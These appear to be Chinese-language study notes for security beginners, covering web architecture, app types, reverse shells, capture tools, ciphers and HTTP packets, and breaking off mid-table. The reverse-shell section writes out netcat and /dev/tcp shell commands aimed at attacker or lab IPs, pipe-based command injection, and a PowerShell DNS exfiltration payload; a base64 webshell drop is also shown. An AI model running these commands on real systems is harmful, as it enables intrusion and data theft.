[{"id":"b08904c0bab28ee83d3b8e8bd866184d","title":"网安知识点笔记（持续更新中）","content":"网安知识点基础入门一、Web 应用Web 四大件1.系统\nLinux、windows、macos\n\n2.中间件\n我们经常管 web 中间件叫做 web 服务器或者 web 容器，中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。\n也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）\n常见的 web 中间件有: Apache Websphere IIS tomcat JBoss Weblogic IBM HTTP Server NGINX\n核心功能包括：\n1.HTTP 协议处理：解析请求并生成响应（如 Apache、Nginx 的 HTTP 引擎）\n2.静态资源服务：直接返回 HTML、CSS、图片等文件\n3.动态内容支持：通过 PHP、Node.js 等语言生成个性化数据\n4.安全控制：SSL&#x2F;TLS 加密、访问权限管理\n\n\n\n 中间件配置对后续部署的影响\n中间件（如 Nginx、Tomcat、Redis）的配置直接影响系统的性能、稳定性和可维护性，具体如下：\n\n负载均衡：Nginx 可配置反向代理，将请求分发到多个后端服务器，避免单节点过载，提升系统可用性。\n缓存策略：Redis 作为缓存中间件，合理配置缓存过期时间和淘汰策略，可减少数据库访问压力，加快响应速度。\n安全防护：中间件可配置 SSL 证书（HTTPS）、请求过滤（防 SQL 注入、XSS），增强系统安全性。\n日志与监控：中间件的日志配置（如访问日志、错误日志）便于后续故障排查，监控配置（如 CPU &#x2F; 内存占用）可提前发现性能瓶颈\n\n3.数据库\n常见的有：mysql，mssql，access\n\n本地存储：\n\n源码和数据库放在一起\n\n站库分离：\n\n将网站应用程序（前端 + 后端）与数据库服务器分离部署在不同服务器上，优势包括：\n\n提升性能：应用和数据库服务器资源独立分配，避免相互抢占资源（如 CPU、内存）。\n\n增强安全性：数据库服务器可单独配置防火墙和访问策略，减少直接暴露风险。\n\n便于扩展：应用和数据库可各自根据流量需求扩容，例如数据库可通过主从复制提升读性能。\n\n\n云数据库：\n\n安全组和登陆方式配置可以更加复杂。甚至有 oos 对象存储服务，专门用来放置图片和视频，更加安全\n\n4.源码实现网站功能的代码集合，包括：\n\n1.前端技术：HTML&#x2F;CSS&#x2F;JavaScript 构建用户界面，框架如 Vue、React\n2.后端逻辑：PHP、Python、Java 等处理业务\n3.架构模式：\n单体应用：传统模式，代码集中\n微服务：模块式拆分，适合复杂系统\n\n\n\n源码类型：\n\n开源、商业、自研\n\nWeb 架构1.常规化\n原理：源码数据都在同服务器\n影响：无，常规安全测试手法\n\n2.站库分离\n原理：源码数据库不在同服务器\n存储：其他服务器上数据库&amp;云数据库产品\n影响：数据被单独存放，能连接才可影响数据\n\n3.前后端分离\n原理：前端 JS 框架，API 传输数据\n影响：\n1.前端页面大部分不存在漏洞\n2.后端管理大部分不在同域名\n3.获得权限有可能不影响后端\n\n\n\n4.宝塔+phpstudy\n原理：打包类集成环境，权限配置或受配置\n影响：攻击者权限对比区别\n区别：宝塔更安全一点\n\n5.Docker 容器\n原理：虚拟化技术独立磁盘空间\n影响：攻击者虚拟空间磁盘\n\n6.建站分配站\n1.托管2.申请\n原理：利用别人域名模版建立\n影响：实质安全测试非目标资产\n\n7.静态 Web\n例子：大学学的 html 设计网站\n原理：数据没有传输性（js 传输不算）\n影响：无漏洞\n\n8.WAF\n原理：Web 应用防火墙，旨在提供保护\n影响：常规 Web 安全测试手段会受到拦截\n演示：免费 D 盾防护软件\nWindows2012 + IIS +D 盾\n\n\n9.CDN\n原理：内容分发服务，旨在提高访问速度\n影响：隐藏真实源 IP，导致对目标测试错误\n演示：阿里云备案域名全局 CDN 加速服务\nWindows2012 + BT 宝塔面板 + CDN 服务\n\n\n10.OSS\n原理：云存储服务，旨在提高访问速度\n\n演示：https://cloudreve.org/\nWindows2012 + cloudreve + 阿里云 OSS\nhttps://github.com/cloudreve/Cloudreve/releases/tag/3.7.1\n1、启动应用\n2、登录管理\n3、配置存储信息\n4、更改用户组存储属性\n\n阿里云 OSS:\n1、开通 OSS\n2、新建 Bucket\n3、配置 Bucket 属性\n4、配置 Access 访问\n\n\n为什么要使用第三方存储？\n\n静态文件会占用大量带宽\n加载速度\n存储空间\n\n影响：\n\n上传的文件或解析的文件均来自于 OSS 资源，无法解析，单独存储\n\n1、修复上传安全\n\n2、文件解析不一样\n\n3、但 Accesskey 隐患\n\n\n\n\n\n11.反向代理\n正向代理为客户端服务, 客户端主动建立代理访问目标（不代理不可达）\n反向代理为服务端服务, 服务端主动转发数据给可访问地址（不主动不可达）\n\n原理：通过网络反向代理转发真实服务达到访问目的\n\n影响：访问目标只是个代理，并非真实应用服务器\n\n注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！\n\n补充：正向代理就相当于一个服务器你无法访问自己找了个代理服务器去访问        反向代理就是你本来无法访问那个服务器，所以服务器那边整了个搭理服务器让你访问\n\n\n12.负载均衡\n原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务器加载服务，测试过程中存在多个目标情况\n\n二、App 应用应用开发架构1.原生开发原生 APP 开发是指针对特定平台(iOS&#x2F;Android)使用官方语言和工具进行开发的方式。\n安卓一般使用 java 语言开发，当然现在也有 kotlin 语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。\n原生开发有以下特点：\n（1）平台特性\n\niOS 使用 Swift&#x2F;Objective-C + Xcode 开发，遵循 Apple 设计规范\nAndroid 使用 Java&#x2F;Kotlin + Android Studio 开发，遵循 Material Design\n\n（2）安全优势\n\n性能优化好，可直接调用系统安全 API\n可实施更严格的安全措施如代码混淆、完整性校验\n支持双向 TLS(mTLS)等高级安全协议\n\n（3）安全风险\n\n需防范逆向工程(反编译、动态调试)\nAPI 接口暴露风险\n平台差异导致的安全策略不一致\n\n（4）网安测试要点\n\n接口安全测试(抓包分析)\n本地数据存储安全\n组件权限配置检查\n\n（5）安全影响\n\n反编译&amp;抓包&amp;常规测试\n逆向的角度去分析逻辑设计安全\n\n2.H5 语言开发H5(HTML5)是 HTML 的第五代标准，作为现代 Web 开发的核心技术，它已成为构建跨平台应用的重要工具。\n使用 H5 开发的好处有很多，可多端复用，比如浏览器端，ios 端，当然 H5 开发的体验是没有原生好的。一般来说如果这个页面需要分享出去的话，就用 H5 开发。\nH5 开发具有以下特点：\n（1）H5 技术基础\n\n核心组件：HTML5(结构)+CSS3(样式)+JavaScript(逻辑)，三者协同工作\n关键 API：Canvas 绘图、WebGL(3D 渲染)、Web Audio(音频处理)、Geolocation(定位)等\n存储机制：支持 localStorage&#x2F;sessionStorage 本地存储，比 Cookie 更安全但需防范 XSS 攻击\n\n（2）安全特性\n\n沙箱机制：默认运行在浏览器安全沙箱中，限制系统资源访问\nCORS 策略：通过跨域资源共享策略控制外部资源访问\nHTTPS 支持：强制要求混合内容中的敏感资源使用安全传输\n\n（3）安全风险\n\nXSS 漏洞：动态内容注入风险高于原生应用\n数据泄露：本地存储数据可能被恶意读取\n中间人攻击：网络阐述层需额外加密保护\n\n3.使用 flutter 开发Flutter 是 Google 推出的跨平台应用开发框架，使用 Dart 语言编写，能够构建 iOS、Android、Web 及桌面端应用。但由于是近几年退出的的，技术比较新，生态还不完善，开发效率偏低\nFlutter 开发具有以下特点：\n（1）核心特性\n\n跨平台支持：一套代码可编译为 iOS、Android、Web、Windows、macOS 和 Linux 应用\n高性能渲染：使用 Skia 引擎直接渲染，绕过平台原生组件，性能接近原生应用\n热重载功能：修改代码后无需重启应用即可看到效果，大幅提升开发效率\n\n（2）安全优势\n\n代码混淆支持：可对 Dart 代码进行混淆，增加逆向工程难度\n安全存储机制：提供 flutter_secure_storage 等插件安全存储敏感数据\nHTTPS 强制支持：网络请求默认强制使用 HTTPS 加密传输\n\n（3）安全风险\n\nDart 代码反编译：相比原生代码更易被反编译分析\n插件安全依赖：第三方插件可能引入安全漏洞\n跨平台一致性风险：不同平台可能实现安全机制不一致\n\n（4）网安测试要点\n\n接口安全测试：检查 API 接口的认证、授权和数据加密\n本地存储检查：验证敏感数据是否加密存储\n权限管理审计：检查应用是否遵循最小权限原则\n代码混淆验证：确认发布版本是否经过充分混淆\n\n4.常规 Web 开发Web 开发是构建在互联网上运行的网站和应用程序的过程，主要分为前端和后端两大技术方向。\nWeb App 软件开发简单地说，就是开发一个网站，然后加入 app 的壳。Web App 一般非常小，内容都是 app 内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且 app 内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。\nWeb 开发具有以下特点：\n（1）核心技术栈\n\n前端技术：\t\nHTML：定义网页结构和内容\nCSS：控制网页样式和布局\nJavaScript：实现交互功能和动态效果\n前端框架：React、Vue、Angular 等提高开发效率\n\n\n后端技术：\n服务器语言：PHP、Java、Python、Node.js 等\n数据库：MySQL、PostgreSQL、MongoDB 等\nWeb 服务器：Apache、Nginx 等\n\n\n\n（2）安全特性\n\n浏览器安全机制：\n同源策略限制跨域访问\nCSP(内容安全策略)可缓解 XSS 攻击\nHTTPS 加密传输保障数据安全\n\n\n认证与授权：\n支持多种认证方式(OAuth、JWT 等)\n可实施细粒度访问控制\n\n\n\n（3）安全风险\n\n常见漏洞：\nXSS(跨站脚本攻击)\nSQL 注入\nCSRF(跨站请求伪造)\n文件上传漏洞\n\n\n数据安全风险：\n敏感信息泄露\n会话劫持\nAPI 接口滥用\n\n\n\n（4）网安测试要点\n\n渗透测试：\n检查输入验证和输出编码\n测试认证和会话管理机制\n验证敏感数据保护措施\n\n\n代码审计\n检查安全编码实践\n识别硬编码凭证\n评估第三方库风险\n\n\n\n三、反弹 shell1.文件上传下载作用：解决无图形化&amp;解决数据传输\n使用：在 ip 地址搭建 web 在目录上放我们的工具，访问即可下载，我们利用网站生成传输文件命令，通过命令执行漏洞让目标下载上我们的工具，然后可以进行我们下一步的操作\n![](..&#x2F;images&#x2F;网安知识点&#x2F;屏幕截图 2025-06-15 232304.png)\n![](..&#x2F;images&#x2F;网安知识点&#x2F;屏幕截图 2025-06-15 233009.png)\n2.反弹 shell 命令（1）定义\n\n反弹 Shell 是一种网络攻击技术，被控端（受害者）主动连接控制端（攻击者），并将命令行输入输出重定向到控制端，实现远程控制。与传统的 SSH、Telnet 等 正向连接 相反，反弹 Shell 通过角色反转绕过防火墙等限制\n\n（2）基本原理\n\n控制端：监听指定 TCP&#x2F;UDP 端口（如 nc -lvp 4444）。\n被控端：执行命令将 Shell 会话重定向到控制端（如 bash -i &amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1），通过 Socket 通信传输数据\n\n（3）正向连接\n\n定义：正向连接指 控制端（攻击者）主动发起连接 至被控端（目标机器），要求目标机器开放指定端口并允许入站连接\n原理：\n被控端启动监听服务（如 nc -lvvp 5566 -e /bin/bash）。\n控制端主动连接目标 IP 和端口（如 nc 目标IP 5566），建立 Shell 会话\n\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到本地 5566 端口nc -e cmd -lvp 5566//主动连接目标 5566ncat 47.122.23.131 5566\n\n\nWindows 控制 Linux\n\n1234//绑定 SH 到本地 5566 端口ncat -e /bin/sh -lvp 5566//主动连接目标 5566nc 47.94.236.117 5566\n\n\n特点：\n控制端主动连接目标\n类似 SSH&#x2F;Telnet 等传统服务\n适用于内网无防护环境\n\n\n限制：\n目标需有固定公网 IP 或端口映射\n防火墙&#x2F;NAT 可能阻止入站连接\n动态 IP 目标难以持续控制\n\n\n典型场景：\n内网渗透：攻击已进入内网，直接连接未防护的目标机器\n服务暴露：目标机器主动开放端口提供远程管理（如数据库服务）\n\n\n\n（4）反向连接\n\n定义：\n反向连接指 被控端主动连接控制端，由攻击者预先监听端口，目标机器发起请求建立 Shell 会话\n\n\n原理：\n控制端监听端口（如 nc -lvp 4444）。\n被控端执行命令反向连接（如 bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1）\n\n\nWindows 控制 Linux\n\n1234//绑定 CMD 到目标 5566 端口ncat -e /bin/sh 47.122.23.131 5566  //靶机//等待 5566 连接nc -lvvp 5566\n\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到目标 5566 端口nc -e cmd 47.94.236.117 5566   //靶机//等待 5566 连接ncat -lvvp 5566\n\n\n特点：\n被控端主动出站\n控制端无需暴露 IP\n适应动态 IP 环境\n\n\n优势：\n绕过防火墙&#x2F;NAT 限制\n隐蔽性强，避免 IDS 检测\n适合外网渗透和持久控制\n\n\n典型场景：\n防火墙绕过：目标仅允许出站流量（如企业内网）\n动态 IP 控制：目标 IP 频繁变化（如家庭宽带）\n恶意软件分发：木马主动连接 C2 服务器\n\n\n\n（5）正反向连接对比\n\n\n\n对比维度\n正向连接\n反向连接\n\n\n\n连接方向\n控制端 → 被控端\n被控端 → 控制端\n\n\n防火墙穿透\n依赖入站规则\n利用出站规则\n\n\n适用环境\n内网无防护\n外网&#x2F;动态 IP\n\n\n隐蔽性\n易被检测\n隐蔽性高\n\n\n工具依赖\n需目标开放端口\n需控制端监听端口\n\n\n（6）命令执行\n\n通过管道符，进行额外的命令执行\nwindows： |  &amp;  ||  &amp;&amp;\nLinux： ;  |  ||  &amp;  &amp;&amp;  （特有&#96;&#96;和;）\n例子：\nping -c 1 127.0.0.1 ; whoami\n\n\n\n（7）数据不回显\n\n通常我们执行命令，要先看目标是什么系统，但如果没有回显，就不能用 ping -c 1 127.0.0.1 ; whoami\n如果是 Linux 的话，我们可以 ping 反引号+whoami+反引号.dns 网址，就可以在那个网址上看到执行完 whoami 的 ip\n但 windows 不行，windows 并没有&#96;&#96;所以我们需要，用别的方法来进行操作，比如\n\n12127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#x27;\\&#x27;,&#x27;xxx&#x27;);$y=&#x27;.dns网址&#x27;;$z=$x+$y;ping $z//我们可以通过powershell将我们想要输出的内容，通过变量进行输出，这样也可以得到我们想要的信息\n\n\n\n\n\n四、抓包工具Fiddler\n核心定位：HTTP&#x2F;HTTPS 调试代理，专注 Web 应用层安全分析\n\n协议支持：HTTP&#x2F;HTTPS（可解密 SSL&#x2F;TLS）、WebSocket。\n\n网络安全应用场景：\n\n漏洞挖掘：拦截修改请求&#x2F;响应，测试 XSS、CSRF、参数篡改等漏洞\n会话劫持：捕获 Cookie&#x2F;Session ID，重放会话验证身份验证缺陷\nHTTPS 解密：通过中间人攻击（MITM）解密 HTTPS 流量，分析加密内容\n\n\n使用技巧：\n\n断点调试：Rules &gt; Automatic Breakpoints 拦截请求修改参数（如注入 Payload）\nAutoResponder：模拟恶意响应（如替换 JS 文件植入后门）\n移动端抓包：配置手机代理至 PC IP+端口（默认 8888），安装 Fiddler 根证书解密 HTTPS\n\n\n\nCharles\n核心定位：HTTP&#x2F;HTTPS 代理，侧重 API 调试与可视化分析\n协议支持：HTTP&#x2F;HTTPS、FTP、SMTP。\n网络安全应用场景：\nAPI 安全测试：树状结构展示请求层级，分析接口参数敏感数据泄露\n重放攻击测试：修改历史请求重复发送，验证服务端幂等性漏洞\n弱网模拟：Proxy &gt; Throttle Settings 测试超时处理、重放攻击成功率\n\n\n使用技巧：\nMap 功能：重定向请求至恶意服务器（Tools &gt; Map Remote）\nSSL 代理：Proxy &gt; SSL Proxying Settings 添加 *:443 全局解密 HTTPS\n移动端配置：类似 Fiddler，需安装 Charles 证书（Help &gt; SSL Proxying）\n\n\n\nTcpDump\n核心定位：命令行网络嗅探器，适用于服务器层流量捕获\n协议支持：全协议（TCP&#x2F;IP 栈），包括 ARP、ICMP、DNS 等。\n网络安全应用场景：\n网络层攻击检测：抓取 SYN 洪水攻击（tcpdump &#39;tcp[tcpflags] &amp; tcp-syn != 0&#39;）\n异常流量分析：识别异常 ARP 请求（ARP 欺骗）、异常 ICMP（隧道攻击）\n数据泄露监控：捕获含敏感关键词的明文传输（如 tcpdump -A port 80 | grep &quot;password&quot;）\n\n\n\nBurpSuite\n核心定位：集成化 Web 应用渗透测试平台\n协议支持：HTTP&#x2F;HTTPS、WebSocket。\n网络安全应用场景：\n自动化漏洞扫描：Scanner 模块检测 SQL 注入、XSS 等 OWASP Top 10 漏洞\n暴力破解：Intruder 模块自动化密码爆破（如撞库攻击测试）\n逻辑漏洞挖掘：Repeater 修改请求顺序，测试越权、支付漏洞\n\n\n使用技巧：\n证书配置：浏览器安装 Burp CA 证书（http://burp/cert）解密 HTTPS\n爬虫与扫描：Spider 映射站点结构，Scanner 自动扫描入口点\n插件扩展：集成 Logger++ 记录历史流量，Autorize 测试垂直越权\n\n\n\nWireshark\n核心定位：全协议深度解析的网络协议分析器\n协议支持：超 700 种协议（TCP&#x2F;IP、DNS、DHCP、SSH 等）。\n网络安全应用场景：\n协议漏洞分析：解析异常协议字段（如畸形 DNS 响应引发缓存中毒）\n网络取证：重组 TCP 流追踪攻击路径（Follow TCP Stream）\n恶意软件通信：检测 C2 服务器连接（如识别 DNS 隧道、非标准端口加密流量）\n\n\n使用技巧：\n显示过滤器：http.request 过滤 HTTP 请求，tls.handshake 聚焦 TLS 协商\n着色规则：标记异常流量（如 TCP 重传标红）\n统计功能：Statistics &gt; Endpoints 定位高流量异常主机\n\n\n\n科来网络分析系统\n核心定位：国产企业级流量分析工具，侧重网络诊断与安全审计\n协议支持：主流协议全覆盖，支持自定义协议解码。\n网络安全应用场景：\n内网威胁狩猎：矩阵视图 可视化主机连接，定位横向移动或矿机通信\n木马检测：分析异常 DNS 请求（如频繁解析动态域名）\n数据泄露监控：日志视图 追踪 HTTP 文件传输、SMTP 邮件外发\n\n\n使用技巧：\n诊断视图：自动标记 TCP 重传、ARP 欺骗等异常事件\n回溯分析：保存流量回放复现攻击链（文件 &gt; 保存抓包文件）\n自定义协议：解码私有协议或恶意软件通信格式\n\n\n\n各个抓包工具的差异\n\n\n工具\n最佳场景\n协议侧重\n安全测试优势\n\n\n\nFiddler\nWeb 调试&#x2F;移动端 HTTPS 分析\nHTTP&#x2F;HTTPS\n请求篡改、会话劫持\n\n\nCharles\nAPI 安全&#x2F;弱网测试\nHTTP&#x2F;HTTPS\n流量重定向、重放攻击\n\n\nTcpdump\n服务器层流量捕获\n全协议\n实时攻击检测、命令行高效操作\n\n\nBurp Suite\nWeb 渗透测试\nHTTP&#x2F;HTTPS\n自动化漏洞扫描、暴力破解\n\n\nWireshark\n全协议深度解析\n700+协议\n协议漏洞分析、网络取证\n\n\n科来\n内网威胁狩猎&#x2F;网络诊断\n主流协议+自定义\n可视化追踪、自动异常诊断\n\n\n五、算法加密1.算法加密的应用对象和安全价值（1）数据传输保护\n\nHTTPS&#x2F;TLS：采用混合加密（RSA 交换密钥 + AES 加密数据），防中间人窃听。TLS 1.3 已禁用弱算法（如 RC4、SHA-1），优先支持 AES-GCM 和 ChaCha20-Poly1305。\n端到端加密：消息应用（如 Signal）使用双棘轮协议，每次会话更新密钥，防历史消息解密\n\n（2）敏感数据存储\n\n数据库字段加密：信用卡号、身份证号等采用 AES-256 加密，密钥由 HSM（硬件安全模块）管理\n全盘加密：BitLocker（Windows）、FileVault（Mac）使用 XTS-AES 模式，防物理窃取\n\n（3）身份验证与签名\n\n数字证书：RSA&#x2F;ECC 非对称加密实现身份绑定，CA 私钥泄露将导致信任链崩塌（如沃通事件）\n区块链交易：ECDSA 签名验证资产所有权，私钥丢失即永久丧失资产控制权\n\n2.数据传输（1）传输数据-编码型&amp;加密型\n\n某视频\n某 Web 站\n博客登录\nApp 斗地主\n影响：漏洞探针\n\n（2）传输格式-常规&amp;JSON&amp;XML\n\nApp 期 H\nApp 斗地主\n影响：发送漏洞探针，回显数据分析\n\n（3）密码存储-Web&amp;系统&amp;三方应用\n\nZZZCMS&amp;Dz\nWin&amp;Linux\nMSSQL&amp;MYSQL\n影响：安全后渗透测试\n\n（4）代码混淆-源代码加密&amp;逆向保护\n\nPHP&amp;Js 混淆加密\nEXE&amp;JAR 代码保护\n影响：代码审计，逆向破解\n\n为什么要了解数据在传输的时候进行编码？\n\n对方服务器可能会在接受的时候进行解码在带入\n\n如果我们还是按照原有思路不对自己的 Payload 进行同样编码的话 传入过去的东西就是不认识的东西 测试无效\n\n正确方式：测试的话也要进行 payload 同样的加密或编码进行提交\n安全测试漏洞时候 通常都会进行数据的修改增加提交测试\n以数据的正确格式发送 接受才行\n\n\n3.常见加密算法&#x3D;&#x3D;3.1.单向散列加密&#x3D;&#x3D;（1）**核心原理与识别方式**\n\n原理：将任意长度输入（消息）通过哈希函数（如 SHA-256）转换为 固定长度的输出（散列值），具有 单向性（不可逆）和 抗碰撞性（不同输入产生相同输出的概率极低）\n优点：方便存储，损耗低：加密&#x2F;加密对于性能的损耗微乎其微。\n缺点：单向散列加密的缺点就是存在暴力破解的可能性，最好通过加掩码值的方式提高安全性，此外可能存在散列冲突。我们都知道 MD5 加密也是可以破解的。\nmd5 的三个特征：\n确定性：一个原始数据的 MD5 值是唯一的，同一个原始数据不可能会计算出多个不同的 MD5 值。\n碰撞性：原始数据与其 MD5 值并不是一一对应的，有可能多个原始数据计算出来的 MD5 值是一样的，这就是碰撞。\n不可逆：也就是说如果告诉你一个 MD5 值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第 4 点，一个给定的 MD5 值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。\n\n\n\n（2）**核心算法**\n\n安全算法：SHA-256、SHA-3（抗量子计算）\n风险算法：MD5、SHA-1（已被攻破，易碰撞攻击）\n\n（3）**当今社会应用场景**\n\n密码存储：用户密码存储为散列值（如 bcrypt 加盐哈希），即使数据库泄露也无法还原明文\n文件完整性校验：软件下载站提供文件的 SHA-256 散列值，用户验证文件是否被篡改（如 Tomcat 官网）\n数字签名基础：对消息摘要签名（如 HMAC 算法），确保数据来源可信（API 接口验签）\n云盘秒传：通过文件哈希值匹配云端已有文件，避免重复上传（如百度网盘）\n\n&#x3D;&#x3D;3.2.对称加密&#x3D;&#x3D;（1）**核心原理与识别方式**\n\n原理：加密和解密使用 同一密钥（如 AES-256），算法高效但密钥需安全分发\n优点：对称加密优点是算法公开、计算量小、加密速度快、加密效率高\n缺点：发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。\n识别特征：\n加&#x2F;解密速度快，适合大数据量；\n密钥管理复杂（需安全通道传输密钥）；\n常见算法标识：AES、DES（已淘汰）、3DES。\n\n\n\n（2）**核心算法**\n\nAES（Advanced Encryption Standard）：支持 128&#x2F;192&#x2F;256 位密钥，GCM 模式提供认证加密\n3DES：三重 DES 增强安全性，但因性能差被 AES 取代\n\n（3）**当今社会应用场景**\n\n数据传输加密：\nHTTPS 通信中的 会话加密（TLS 握手后使用 AES 加密数据流）\nWi-Fi 安全协议（WPA3 使用 AES-256）\n\n\n静态数据保护：\n数据库字段加密（如信用卡号用 AES 加密存储）\n全盘加密工具（如 BitLocker、FileVault）\n\n\n实时通信加密：\n视频会议系统（如 Zoom）使用 AES 加密音视频流\n\n\n\n\n3.3.非对称加密（1）**核心原理与识别方式**\n\n原理：使用 密钥对（公钥加密、私钥解密），公钥可公开，私钥保密\n优点：非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。\n缺点：缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。\n识别特征：\n加&#x2F;解密速度慢，适合小数据量（如密钥交换）；\n支持数字签名（私钥签名，公钥验证）；\n常见算法标识：RSA、ECC（椭圆曲线）。\n\n\n\n（2）**核心算法**\n\nRSA：基于大整数分解难题（密钥 ≥2048 位）\nECC：相同安全强度下密钥更短（256 位 ≈RSA 3072 位），适合移动设备\n\n（3）**当今社会应用场景**\n\n安全通信基石：\nTLS&#x2F;SSL 握手：通过 RSA&#x2F;ECC 交换对称会话密钥（如浏览器 HTTPS 连接）\n端到端加密：消息应用（如 Signal）使用 ECDH 协议动态生成密钥\n\n\n数字身份认证：\n数字证书（CA 用私钥签名，公钥验证网站身份）\n区块链交易签名（比特币用 ECDSA 验证所有权）\n\n\n数据防篡改：\n文档&#x2F;软件签名（如 Adobe PDF 签名、安卓 APK 签名）\n\n\n\n\n\n3.4.Base 系列加密1.Base64\n\n原理：\n\n将 3 字节（24 位） 二进制数据按 6 位一组 划分为 4 组，每组映射到 64 字符集（A-Za-z0-9+/），末尾用 = 填充至 4 的倍数。\n示例： &quot;ABC&quot; → 二进制 01000001 01000010 01000011 → 6 位分组 010000 010100 001001 000011 → 映射为 &quot;QUJD&quot;。\n\n\n识别特征：\n\n密文含 A-Za-z0-9+/=，长度必为 4 的倍数（如 SGVsbG8=）；\n无小写字母 o、数字 0、大写 I 等易混淆字符。\n\n\n攻防应用：\n\n攻击利用：隐藏 Web Shell（echo PD9waHA... | base64 -d &gt; shell.php）\nWAF 绕过：多重编码（Base64 → URL 编码 → Hex）干扰正则检测\n防御场景：邮件附件、HTTPS 证书、图片内嵌（Data URL）。\n\n\n安全风险：非加密算法，可直接解码 暴露数据，需搭配 AES 等加密使用\n\n\n2.Base32\n\n原理：将 5 字节（40 位） 数据按 5 位一组 划分为 8 组，映射到 32 字符集（A-Z2-7），用 = 填充至 8 的倍数。\n识别特征：\n全大写字母+数字 2-7（如 JBSWY3DP），无 1/8/9/0 等字符；\n长度通常为 8 的倍数。\n\n\n攻防应用：\n隐蔽通信：恶意软件命令传输（如 DNS 隧道中隐藏 C2 指令）；\n兼容性优势：比 Base64 更易人工识别（无大小写混淆）\n\n\n\n3.5.加密算法的对比与选型\n\n\n技术类型\n代表算法\n密钥管理\n速度\n安全性依赖\n典型应用场景\n攻击风险\n\n\n\n单向散列加密\nSHA-256, bcrypt\n无密钥\n极快（纳秒级）\n抗碰撞性\n密码存储、文件校验\n彩虹表攻击（未加盐）\n\n\n对称加密\nAES-256-GCM\n单一密钥，需安全分发\n快（GB&#x2F;s 级）\n密钥保密性\n数据库加密、实时通信\n侧信道攻击、弱密钥爆破\n\n\n非对称加密\nECC-256, RSA-2048\n密钥对（公钥&#x2F;私钥）\n慢（KB&#x2F;s 级）\n私钥保密性\n密钥交换、数字签名\n量子计算威胁（RSA）\n\n\nBase64 编码\n无\n无密钥\n快\n非加密！\nHTTP 数据传输、邮件附件\n裸数据暴露、WAF 绕过\n\n\n4.加密算法的特点4.1.MD5\n由数字“0-9”和字母“a-f”所组成的字符串\n固定的位数 16 和 32 位\n解密需求：密文即可，但复杂的明文可能解不出\n\n4.2.Base64\n大小写区分，通过数字和字母的组合\n一般情况下密文尾部都会有两个等号，明文很少的时候则没有\n明文越长密文越长，一般不会出现 “&#x2F;“ “+” 在密文中\n\n4.3.AES、DES\n同 BASE64 基本类似，但一般会出现 “&#x2F;“ 和 “+” 在密文中\n解密需求：密文，模式，加密 Key，偏移量，条件满足才可解出\n\n4.4.RSA\n特征同 AES, DES 相似，但是长度较长\n解密需求：密文，公钥或私钥即可解出\n\n六、HTTP 数据包一、HTPP 数据包基础1. 定义与定位\n本质：HTTP 数据包是客户端（如浏览器）与服务器之间传输数据的格式化信息单元，分为 请求报文（Request）和 响应报文（Response）\n\n协议层级：位于 OSI 模型的应用层，依赖传输层 TCP 协议（默认端口 80）建立可靠连接\n\n\n2. 通信模型\n请求-响应模式：\n\n客户端发送请求 → 服务器返回响应 → 连接关闭（HTTP&#x2F;1.0）或复用连接（HTTP&#x2F;1.1+）\n\n\n无状态性：每个请求独立，需依赖 Cookie&#x2F;Session 等机制维持会话状态\n\n\n二、请求报文结构解析1. 请求行（Request Line）1GET /api/data?page=1 HTTP/1.1\n\n\n请求方法：定义操作类型（共 8 种，详见下文）\n\n请求路径：资源位置（如 /api/data），可含查询参数（?page=1）。\n\n协议版本：HTTP/1.1（主流）或 HTTP/2（二进制分帧）\n\n\n2.请求头（Request Headers）键值对形式，描述客户端环境及请求属性：\n\n\n\n常用请求头\n功能说明\n\n\n\nHost: example.com\n目标域名（HTTP&#x2F;1.1 强制要求）\n\n\nUser-Agent: ...\n客户端标识（浏览器&#x2F;操作系统信息）\n\n\nAccept: text/html\n可接收的响应类型（MIME 类型）\n\n\nCookie: id=abc123\n携带会话凭证\n\n\nAuthorization: Bearer ...\n身份认证令牌\n\n\n3.请求体（Request Body）\n适用场景：POST、PUT、PATCH 方法提交数据（如 JSON、表单）\n长度标识：Content-Length 或 Transfer-Encoding: chunked（分块传输）\n\n三、响应报文结构解析1.状态行（Status Line）1HTTP/1.1 200 OK\n\n\n协议版本：同请求报文。\n状态码：3 位数字，标识处理结果（分类见下表）\n状态文本：描述性短语（如 OK）。\n\n2.状态码分类\n\n\n状态码\n分类\n名称\n定义与触发场景\n典型响应头\n幂等性\n\n\n\n100\n1xx (信息响应)\nContinue\n服务器已接收请求头，要求客户端继续发送请求体（用于大文件上传前的确认）\nExpect: 100-continue\n-\n\n\n101\n\nSwitching Protocols\n服务器同意协议切换（如 HTTP 升级至 WebSocket）\nUpgrade: websocket\n-\n\n\n102\n\nProcessing\n服务器已接收请求但处理未完成（WebDAV 异步操作）\n-\n-\n\n\n200\n2xx (成功)\nOK\n请求成功，响应体包含资源（GET）或操作结果（POST）\nContent-Type\n是\n\n\n201\n\nCreated\n资源创建成功（常见于 POST&#x2F;PUT 请求）\nLocation: /new-resource\n否\n\n\n204\n\nNo Content\n请求成功但无返回内容（常见于 DELETE 